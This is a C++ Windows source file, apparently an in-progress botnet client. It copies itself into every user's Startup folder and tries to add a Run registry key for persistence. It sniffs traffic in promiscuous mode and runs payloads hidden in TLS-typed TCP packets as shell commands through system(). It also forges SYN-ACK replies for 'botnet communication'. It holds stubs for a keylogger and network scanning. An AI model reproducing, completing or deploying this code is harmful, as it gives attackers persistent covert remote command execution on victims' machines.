// try_3.cpp : Defines the entry point for the console application.
// Purpose:  This is a functioning client

#include "stdafx.h"
#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <winapifamily.h>
#include <stdlib.h>
#include <stdio.h>
#include <vector>
#include <pcap.h>
#include <bitset>
#include <IPHlpApi.h>
#include <fstream>

#define MAX_THREADS 2
CRITICAL_SECTION HandleLock;

//specify WinSock lib or else symbols will not match
#pragma comment(lib,"ws2_32.lib") //WinSock lib
#pragma comment(lib, "IPHLPAPI.lib") //IP Helper lib

//contains the TLS packet header
typedef struct tls_header{
	u_char type;		// Contains the type of packet
	u_short version;	// This is not useful right meow
	u_short length;		// Length of data
}tls_header;

//contains the dns packet data
typedef struct dns_payload {
	u_char size;
	u_char junk;
	u_char junk2;
}dns_payload;

//contains the values of mac address as integers
typedef struct mac_values {
	int value0;
	int value1;
	int value2;
	int value3;
	int value4;
	int value5;
}mac_values;

// 4 bytes IP addresses
typedef struct ip_address {
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
}ip_address;

//dns header
typedef struct dns_header {
	u_short identifier;
	u_short flags_codes;
	u_short qcount;
	u_short acount;
	u_short nscount;
	u_short arcount;
}dns_header;

// UDP header used for dns packets
typedef struct udp_header {
	u_short sport;          // Source port
	u_short dport;          // Destination port
	u_short len;            // Datagram length
	u_short crc;            // Checksum
}udp_header;

/*
*This struct will be used to decapsulate tcp headers
*/
typedef struct tcp_head {
	u_short sport;
	u_short dport;
	u_int seq_num;
	u_int ack_num;
	u_char data_off;
	u_char flag;
	u_short win_size;
	u_short checksum;
	u_short urgpoint;
}tcp_head;

/*
*This struct will be used to decapsulate ipv4 headers
*/
typedef struct IPv4 {
	u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)
	u_char  tos;            // Type of service 
	u_short tlen;			// Total Length
	//u_char TLmajor;			// Total length major
	//u_char TLminor;			// Total length minor
	u_short identification; // Identification
	u_short flags_fo;       // Flags (3 bits) + Fragment offset (13 bits)
	u_char  ttl;            // Time to live
	u_char  proto;          // Protocol
	u_short crc;            // Header checksum
	ip_address  saddr;      // Source address
	ip_address  daddr;      // Destination address
	u_int   op_pad;         // Option + Padding
}IPv4;

/*
 *This struct will be used to decode Ethernet headers
 */
typedef struct eth_header {
	u_char dest[6];
	u_char src[6];
	u_short type;
}eth_header;

//function prototypes
int reg_maker();
void split(const std::string& s, char delim, std::vector<std::string>& v);
void remover(std::vector<std::string>& v);
int matcher(char firstletter);
std::string parser(const std::string res, std::vector<std::string> v);
std::string find_curr_dir();
int startup_finder();
int size_of_list(pcap_if_t*  list);
pcap_t* get_handle(pcap_if_t** first_device);
void decapsulate(const u_char *data, int size);
pcap_if_t* capture_em_packets();
void get_mac(mac_values** values);
void ipv4_address(std::vector<std::string>& lines_vect, std::vector<std::string>& ip_addresses);
void get_ip(std::vector<std::string>& ip_addresses);
int send_packet(std::string address, std::string mac_addr, std::string option);

/*
 *This is the capture thread
 *returns:
 */
DWORD WINAPI capture(PVOID pPARAM) {
	//captures packets using winpcap driver
	pcap_if_t* device = capture_em_packets();//device is pointer to list of devices

	pcap_t* adhandle;					//stores the handle created by pcap_open for pcap_next_ex to read packets
	struct pcap_pkthdr *pktHeader;		//stores packet header information
	const u_char *pkt_data;				//stores packet data
	char error_msg[PCAP_ERRBUF_SIZE];	//error message buffer
	struct bpf_program opcode;			//this will contain useful shit
	u_int netmask;						//this will contain the netmask of the interface capturing

										//open dev list
	if ((adhandle = pcap_open(device->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, error_msg)) == NULL) {
		pcap_freealldevs(device);
		return -1;
	}

	//ip proto \\udp and port 53 :That will do a lot of filtering but it's not needed right now
	//compile filter
	netmask = ((struct sockaddr_in*) (device->addresses->netmask))->sin_addr.S_un.S_addr;
	if (pcap_compile(adhandle, &opcode, "ip", 1, netmask) < 0) {
		pcap_freealldevs(device);
		return -1;
	}

	//set filter
	if (pcap_setfilter(adhandle, &opcode) < 0) {
		pcap_freealldevs(device);
		return -1;
	}

	//free dev list
	pcap_freealldevs(device);

	//capture packets on dev
	/////////infinite loop need to change///////////
	while (pcap_next_ex(adhandle, &pktHeader, &pkt_data) >-1) {

		//inspect packet
		if (pktHeader->len > 0) {
			decapsulate(pkt_data, pktHeader->caplen);
		}
	}
	///////////////////////////////////////////////
	return 0;
}

/*
 *This will run the key logger
 *returns:
 */
DWORD WINAPI keg_logging(PVOID pPARAM) {
	return 0;
}

/*
 *
 */
int main()
{
	//Implements persistence by copying itself to startup folder
	//redirect output into stdout to buffer via pipe
	startup_finder();

	InitializeCriticalSection(&HandleLock);

	//trying the multithreaded prog
	DWORD id;
	HANDLE hCapture = CreateThread(NULL, 0, capture, (PVOID)1, 0, &id);
	//HANDLE hSender = CreateThread(NULL, 0, command_console, (PVOID)2, 0, &id);

	//Wait for objects
	WaitForSingleObject(hCapture, INFINITE);
	DeleteCriticalSection(&HandleLock);

	int temp = 0;
	std::cin >> temp;
	return 0;
}

/*
* This function will edit registries in order to
* obtain persistence for the client and check to
* see if this has already been accomplished.
*/
int reg_maker() {
	int result = 0; //holds the result of function

					//check if reg key exists
	char* key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hkey;
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
		std::cout << "if one" << std::endl;
		DWORD data = 0;
		DWORD length = sizeof(data);
		DWORD type = REG_DWORD;
		char* value = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence";

		//Query Value to check if it has the location of the file in it
		///////////////////////////////////////ERROR HERE//////////////////////////////////////////////
		if (RegQueryValueExA(HKEY_LOCAL_MACHINE, value, 0, (LPDWORD)&type, (LPBYTE)&data, &length) != ERROR_SUCCESS)
			std::cout << "Could not query reg key" << std::endl;
		///////////////////////////////////////////////////////////////////////////////////////////////
		else {
			//data += "C:\\Users\\michael\\Documents\\Visual Studio 2015\\Projects\\try_3\\Debug\\try_3.exe";
			//Add key inside try_3 using the RegSetValueExA function
			if (RegSetValueExA(HKEY_LOCAL_MACHINE, value, NULL, REG_DWORD, (LPBYTE)&data, sizeof(DWORD)) != ERROR_SUCCESS)
				std::cout << "Failed to set registry value" << std::endl;
			std::cout << data << std::endl;
		}
	}
	else
		std::cout << "Could not open reg key" << std::endl;



	//close registry editor
	return 0;
}

/*
*This function will split a string based on
*the character to passed to it and insert the
*parts into a vector
*/
void split(const std::string& s, char delim, std::vector<std::string>& v) {
	std::string::size_type i = 0;
	std::string::size_type j = s.find(delim);

	while (j != std::string::npos) {
		v.push_back(s.substr(i, j - i));
		i = ++j;
		j = s.find(delim, j);

		if (j == std::string::npos)
			v.push_back(s.substr(i, s.length()));
	}
}

/*
*remove the spaces from each string in the vector
*/
void remover(std::vector<std::string>& v) {
	for (int i = 0; i < v.size(); i++) {
		std::string getting_changed = v[i];
		std::string changed_str = "";
		for (int i = 0; i < getting_changed.size(); i++) {
			if (' ' != getting_changed[i]) {
				changed_str += getting_changed[i];
			}
		}
		v[i] = changed_str;
	}
}

/*
*Checks to see in character matched
*a character in the alphabet or used for directories
*/
int matcher(char firstletter) {
	std::string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\\._:0123456789";
	int res = alphabet.find(firstletter);

	return res;
}

/*
*This will parse the output of a dir command
*and return a vector of Users directories
*/
std::string parser(const std::string res, std::vector<std::string> v) {
	std::string directories = "";
	split(res, '\n', v);
	remover(v);

	for (int i = 0; i < v.size(); i++) {
		int temp = v[i].find('>');
		if (temp == 21) {
			int res = matcher(v[i][22]);
			if (res > -1) {
				for (int x = 22; x < v[i].size(); x++) {
					directories = directories + v[i][x];
				}
			}
		}
		directories += " ";
	}

	return directories;
}

/*
*Finds the current path of the program
*/
std::string find_curr_dir() {
	char Path[FILENAME_MAX];
	std::string exePath = "";

	//Will contain exe path
	HMODULE hmodule = GetModuleHandle(NULL);
	if (hmodule != NULL) {
		//When passing NULL to GetModuleHandle, it returns handle of exe itself
		GetModuleFileName(hmodule, (LPTSTR)Path, (sizeof(Path)));

		//Parses the Character array
		for (int i = 0; i < 260; i++) {
			if (matcher(Path[i]) != -1) {
				exePath += Path[i];
			}
			else if (Path[i] == ' ') {
				exePath += Path[i];
			}
		}
	}
	else {
		std::cout << "Module handle is NULL" << std::endl;
	}

	return exePath;
}

/*
*This function prints the directories/files of the Users
*directory and sends them to the char buffer via the pipe
*/
int startup_finder() {
	const char* cmd = "dir C:\\Users";
	char buffer[128];
	std::string start = "C:\\Users\\";
	std::string end = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
	std::string exePath = find_curr_dir();
	std::string result = "";
	std::vector<std::string> parts;
	std::vector<std::string> folder;
	FILE* _pipe = _popen(cmd, "r");

	//redirects stdout to pipe and adds elements of buffer to result string
	if (!_pipe) {
		std::cout << "ERROR" << std::endl;
	}

	while (!feof(_pipe)) {
		if (fgets(buffer, 128, _pipe) != NULL)
			result += buffer;
	}
	_pclose(_pipe);


	/*
	*Parses result and Splits result string by spaces
	*Loops parts vector to find elements that contain
	*directories then copies the exe to those directories
	*/
	result = parser(result, parts);
	split(result, ' ', parts);
	for (int i = 0; i < parts.size(); i++) {
		int rest = matcher(parts[i][0]);
		if (rest != -1) {
			folder.push_back(parts[i]);
			if (parts[i].find('.') == -1) {
				std::string startup_dir = "copy /B \"" + exePath + "\" \"" + start + parts[i] + end + "\"";
				int i = system(startup_dir.c_str());
			}
		}
	}

	return 0;
}

/*
*This function will find the size of lists created by functions in wpdpack libs
*list: should be the first point of a pcap interface list
*returns: the size of the list parameter
*/
int size_of_list(pcap_if_t*  list) {
	int size = 0;

	//loops until d is NULL and counts elements
	for (pcap_if_t* d = list; d != NULL; d = d->next) {
		std::cout << "Printing device list" << std::endl << d->description << std::endl;
		size++;
	}

	return size;
}

/*
*This function returns the device to capture on used to send packet
*the difference between this function and
*capture_em_packets is return type
*returns: device if successful otherwise returns NULL
*/
pcap_t* get_handle(pcap_if_t** first_device) {
	pcap_if_t* all_devices;				//first point of interface list
	char error_msg[PCAP_ERRBUF_SIZE];	//error message buffer

										//returns on error
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &all_devices, error_msg) == -1) {
		std::cout << "did not get device list" << std::endl;
		return NULL;
	}

	//returns if no interfaces
	if (size_of_list(all_devices) == 0) {
		return NULL;
	}

	//select interface
	//In this case inteface selected is the second interface
	pcap_if_t* device = all_devices;
	std::cout << "Interface Selected: " << device->description << std::endl;
	if (device != NULL) {
		char error_msg[PCAP_ERRBUF_SIZE];	//error message buffer
		pcap_t* adhandle;					//stores the handle created by pcap_open for pcap_next_ex to read packets

		if ((adhandle = pcap_open(device->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, error_msg)) == NULL) {
			pcap_freealldevs(device);
			return NULL;
		}
		(*first_device) = all_devices;
		return adhandle;
	}

	return NULL;
}

/*
*This function will decapsulate packets
*and call functions if needed
*renturns nothing
*/
void decapsulate(const u_char *data, int size) {
	eth_header* eth_hdr;
	eth_hdr = (eth_header*)data;
	IPv4* ih;
	u_int head_len;
	tcp_head* th;
	tls_header* tls_head;
	udp_header* uh;
	//u_short sport;
	//u_short dport;

	if (ntohs(eth_hdr->type) == 0x800) {
		// retireve the position of the ip header
		ih = (IPv4 *)(data + 14); //length of ethernet header
		int ip_header_length = (int)ih->ver_ihl - 64;
		
		//check tcp protocol
		if ((int)ih->proto == 6) {
			//get ip address as string
			std::string address = "";
			char octet[4];
			_itoa_s((int)ih->saddr.byte1, octet, 10);
			address = address + octet + '.';
			_itoa_s((int)ih->saddr.byte2, octet, 10);
			address = address + octet + '.';
			_itoa_s((int)ih->saddr.byte3, octet, 10);
			address = address + octet + '.';
			_itoa_s((int)ih->saddr.byte4, octet, 10);
			address = address + octet;

			//get mac address as string
			std::string mac_address = "";
			char byte[4];
			_itoa_s((int)eth_hdr->src[0], byte, 10);
			mac_address = mac_address + byte + ':';
			_itoa_s((int)eth_hdr->src[1], byte, 10);
			mac_address = mac_address + byte + ':';
			_itoa_s((int)eth_hdr->src[2], byte, 10);
			mac_address = mac_address + byte + ':';
			_itoa_s((int)eth_hdr->src[3], byte, 10);
			mac_address = mac_address + byte + ':';
			_itoa_s((int)eth_hdr->src[4], byte, 10);
			mac_address = mac_address + byte + ':';
			_itoa_s((int)eth_hdr->src[5], byte, 10);
			mac_address = mac_address + byte;
			
			//check total packet length
			int total_packet_length = ((ih->tlen & 0xFF) << 8) | ((ih->tlen >> 8) & 0xFF); //length of data
			total_packet_length = total_packet_length - 20 - (ip_header_length * 4);
			//assume there is layer three data
			if(total_packet_length > 0){
				std::cout << total_packet_length << std::endl;
				std::cout << ip_header_length << std::endl;
				std::cout << "IP Address " << address << std::endl;
				//get tcp header
				head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
				th = (tcp_head *)((u_char*)ih + head_len);

				std::cout << "Flags: " << (int)th->flag << std::endl;
				//check control bit number for ack-psh packet
				if ((int)th->flag == 24) {
					//decapsulate TLS header
					tls_head = (tls_header *)((u_char*)th + 20);

					//have to flip bits because of memory type
					if (tls_head->type == 23) {
						int tls_data_len = ((tls_head->length & 0xFF) << 8) | ((tls_head->length >> 8) & 0xFF); //length of data
						u_char* data_char = ((u_char*)tls_head + 12); //pointer to one byte of data
						std::string command; //string that will contain command used
						for (int i = 0; i < tls_data_len; i++) {
							//get data
							command = command + (char)*data_char;
							//increment
							data_char = data_char + 1;
						}
						//run command
						int return_val = system(command.c_str());
					}
				}

			}
			else {
				//length 6 is reserved for ack packets
				//on botnet communication to complete handshake
				if (ip_header_length > 6) {
					std::cout << ip_header_length << std::endl;
					std::cout << "IP Address " << address << std::endl;
					//get tcp header
					head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
					th = (tcp_head *)((u_char*)ih + head_len);

					//check control bit number for syn packet
					if ((int)th->flag == 2) {
						//send syn ack
						send_packet(address, mac_address, "1");
					}

				}
			}
		}
		else if ((int)ih->proto == 17) {
			//get ip address as string
			std::string address = "";
			char octet[4];
			_itoa_s((int)ih->saddr.byte1, octet, 10);
			address = address + octet + '.';
			_itoa_s((int)ih->saddr.byte2, octet, 10);
			address = address + octet + '.';
			_itoa_s((int)ih->saddr.byte3, octet, 10);
			address = address + octet + '.';
			_itoa_s((int)ih->saddr.byte4, octet, 10);
			address = address + octet;
			std::cout << "IP Address " << address << std::endl;

			//get mac address as string
			std::string mac_address = "";
			char byte[4];
			_itoa_s((int)eth_hdr->src[0], byte, 10);
			mac_address = mac_address + byte + ':';
			_itoa_s((int)eth_hdr->src[1], byte, 10);
			mac_address = mac_address + byte + ':';
			_itoa_s((int)eth_hdr->src[2], byte, 10);
			mac_address = mac_address + byte + ':';
			_itoa_s((int)eth_hdr->src[3], byte, 10);
			mac_address = mac_address + byte + ':';
			_itoa_s((int)eth_hdr->src[4], byte, 10);
			mac_address = mac_address + byte + ':';
			_itoa_s((int)eth_hdr->src[5], byte, 10);
			mac_address = mac_address + byte;

			if (ip_header_length == 8) {
				//get udp header = pointer + length of ipheader
				head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
				uh = (udp_header *)((u_char*)ih + head_len);

				//scan network code here

			}
		}		

	}
}

/*
*This function returns the device to capture on
*returns: device if successful otherwise returns NULL
*/
pcap_if_t* capture_em_packets() {
	pcap_if_t* all_devices;				//first point of interface list
	char error_msg[PCAP_ERRBUF_SIZE];	//error message buffer

										//returns on error
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &all_devices, error_msg) == -1) {
		std::cout << "did not get device list" << std::endl;
		return NULL;
	}

	//returns if no interfaces
	if (size_of_list(all_devices) == 0) {
		return NULL;
	}

	//select interface
	//In this case inteface selected is the second interface
	pcap_if_t* device = all_devices;
	std::cout << "Interface Selected: " << device->description << std::endl;
	if (device != NULL)
		return device;

	return NULL;
}

/*
*This function will get the mac address of the local machine
*and enter it into a values struct
*returns: the mac address of local machine in values struct
*/
void get_mac(mac_values** values) {
	IP_ADAPTER_INFO *info = NULL, *pos;
	DWORD size = 0;

	GetAdaptersInfo(info, &size);
	info = (IP_ADAPTER_INFO *)malloc(size);
	GetAdaptersInfo(info, &size);

	pos = info;
	if (pos != NULL) {
		/////////interate over adapters///////////////
		(*values)->value0 = pos->Address[0];
		for (u_int i = 1; i < pos->AddressLength; i++) {
			//printf("%2.2x", pos->Address[i]);
			switch (i) {
			case 1:
				(*values)->value1 = pos->Address[1];
				break;
			case 2:
				(*values)->value2 = pos->Address[2];
				break;
			case 3:
				(*values)->value3 = pos->Address[3];
				break;
			case 4:
				(*values)->value4 = pos->Address[4];
				break;
			case 5:
				(*values)->value5 = pos->Address[5];
				break;
			default:
				break;
			}
		}
	}
	free(info);
}

/*
*Finds lines that contain ipv4 addresses
*returns: ipv4 addresses inside vector
*/
void ipv4_address(std::vector<std::string>& lines_vect, std::vector<std::string>& ip_addresses) {
	std::size_t found;

	for (int i = 0; i < lines_vect.size(); i++) {
		found = lines_vect[i].find("IPv4");
		if (found != std::string::npos) {
			std::vector<std::string> name_ip;
			std::vector<std::string> space_ip;
			split(lines_vect[i], ':', name_ip);
			split(name_ip[1], ' ', space_ip);
			ip_addresses.push_back(space_ip[1]);
		}
	}

}

/*
*This function will get the ip address of the current machine
*returns: ip_addr struct
*/
void get_ip(std::vector<std::string>& ip_addresses) {
	//take address from captured response
	const char* cmd = "ipconfig";
	char buffer[128];
	std::string result = "";
	std::vector<std::string> lines;
	FILE* _pipe = _popen(cmd, "r");

	//redirects stdout to pipe and adds elements of buffer to result string
	if (!_pipe) {
		std::cout << "ERROR" << std::endl;
	}

	while (!feof(_pipe)) {
		if (fgets(buffer, 128, _pipe) != NULL)
			result += buffer;
	}
	_pclose(_pipe);

	split(result, '\n', lines);
	ipv4_address(lines, ip_addresses);
}

/*
*Used to send ip packets
*returns: success of packet being sent
*/
int send_packet(std::string address, std::string mac_addr, std::string option) {
	mac_values* values = (mac_values*)malloc((sizeof(int) * 6));
	mac_values* mac_address = (mac_values*)malloc((sizeof(int) * 6));
	get_mac(&values);
	u_char packet[62];

	std::vector<std::string> mac_val;
	split(mac_addr, ':', mac_val);
	mac_address->value0 = atoi(mac_val[0].c_str());
	mac_address->value1 = atoi(mac_val[1].c_str());
	mac_address->value2 = atoi(mac_val[2].c_str());
	mac_address->value3 = atoi(mac_val[3].c_str());
	mac_address->value4 = atoi(mac_val[4].c_str());
	mac_address->value5 = atoi(mac_val[5].c_str());

	//destination mac address
	packet[0] = mac_address->value0;
	packet[1] = mac_address->value1;
	packet[2] = mac_address->value2;
	packet[3] = mac_address->value3;
	packet[4] = mac_address->value4;
	packet[5] = mac_address->value5;
	//source mac address
	packet[6] = values->value0;
	packet[7] = values->value1;
	packet[8] = values->value2;
	packet[9] = values->value3;
	packet[10] = values->value4;
	packet[11] = values->value5;
	free(values);

	//ethernet type IPv4
	packet[12] = 8;
	packet[13] = 0;
	//version field and IHL
	int size = 0;
	if (option == "1") {
		packet[14] = 70;
		size = 58;
		//need to set option length
		for (int i = 34; i < 38; i++) {
			packet[i] = i % 256;
		}
		//sending ack packet
		std::ifstream myfile("syn_ack_tcp_header.txt");
		if (myfile.is_open()) {
			std::string line;
			getline(myfile, line);
			std::vector<std::string> bytes;
			split(line, ' ', bytes);
			int index = 0;
			for (int i = 38; i < 58; i++) {
				packet[i] = atoi(bytes[index].c_str());
				index++;
			}
			myfile.close();
		}
	}
	else if (option == "2") {
		packet[14] = 71;
		size = 62;
		//need to set option length
		for (int i = 34; i < 42; i++) {
			packet[i] = i % 256;
		}
	}
	else
		packet[14] = 69; //64 represents 4=>IPv4  5 represents minimum ipv4 length
						 //differentiated services
	packet[15] = 0;
	//total length =1500
	packet[16] = 5;
	packet[17] = 220;
	//identification =19142
	packet[18] = 74;
	packet[19] = 198;
	//flags don't fragment =010
	packet[20] = 64;
	//fragment offset
	packet[21] = 0;
	//TTL
	packet[22] = 255;
	//layer 4 protocol
	packet[23] = 6;  //must be set to detect layer 4 protocols
					  //header checksum
	packet[24] = 39;
	packet[25] = 50;

	//getting all ip addresses from ipconfig command
	std::vector<std::string> ip_addresses;
	get_ip(ip_addresses);
	ip_address* ip_addr = (ip_address*)malloc((sizeof(int) * 4));
	ip_address* dest_addr = (ip_address*)malloc((sizeof(int) * 4));
	//source address
	std::vector<std::string> octets;
	split(ip_addresses[0], '.', octets);
	ip_addr->byte1 = atoi(octets[0].c_str());
	ip_addr->byte2 = atoi(octets[1].c_str());
	ip_addr->byte3 = atoi(octets[2].c_str());
	ip_addr->byte4 = atoi(octets[3].c_str());

	//destination address
	std::vector<std::string> octs;
	split(address, '.', octs);
	dest_addr->byte1 = atoi(octs[0].c_str());
	dest_addr->byte2 = atoi(octs[1].c_str());
	dest_addr->byte3 = atoi(octs[2].c_str());
	dest_addr->byte4 = atoi(octs[3].c_str());

	//source ip address
	packet[26] = ip_addr->byte1;
	packet[27] = ip_addr->byte2;
	packet[28] = ip_addr->byte3;
	packet[29] = ip_addr->byte4;
	//destination ip address
	packet[30] = dest_addr->byte1;
	packet[31] = dest_addr->byte2;
	packet[32] = dest_addr->byte3;
	packet[33] = dest_addr->byte4;
	free(ip_addr);
	free(dest_addr);

	/* Send the packet */
	EnterCriticalSection(&HandleLock);
	pcap_if_t* first_device;
	pcap_t* fp = get_handle(&first_device);
	if (fp == NULL) {
		std::cout << "Did not get interface handle" << std::endl;
		LeaveCriticalSection(&HandleLock);
		return -1;
	}
	if (pcap_sendpacket(fp, packet, size /* size */) != 0)
	{
		std::cout << "\nError sending the packet: \n" << pcap_geterr(fp) << std::endl;
		LeaveCriticalSection(&HandleLock);
		return -1;
	}
	LeaveCriticalSection(&HandleLock);

	return 0;
}